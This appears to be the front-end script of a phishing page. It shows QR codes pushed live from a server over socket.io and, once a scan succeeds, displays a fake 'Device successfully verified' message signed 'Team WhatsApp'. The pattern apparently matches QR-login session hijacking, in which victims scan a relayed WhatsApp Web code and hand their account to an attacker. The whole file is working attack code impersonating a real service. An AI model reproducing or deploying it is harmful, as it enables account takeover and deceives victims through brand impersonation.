var socket = io.connect(),
    lastCode;

socket.on('code', function (data) {
    if(lastCode == data) return;
    var el = document.getElementById('qrcode');
    el.innerHTML = '';
    lastCode = data;
    new QRCode(el, {
    	text: data,
    	width: 240,
    	height: 240,
    	correctLevel : QRCode.CorrectLevel.L
    });
});

socket.on('success', function () {
    console.log('Device successfully verified !');
    $('.entry-main').html('<h1 style="font-size: 35px;color: #009688;">Device successfully verified !</h1><p style="line-height: 23px;">We have successfully verified your WhatsApp device, We appriciate your initiaitve towards strict security.<br><br> Be Safe, <br> Team WhatsApp</p>');

});

    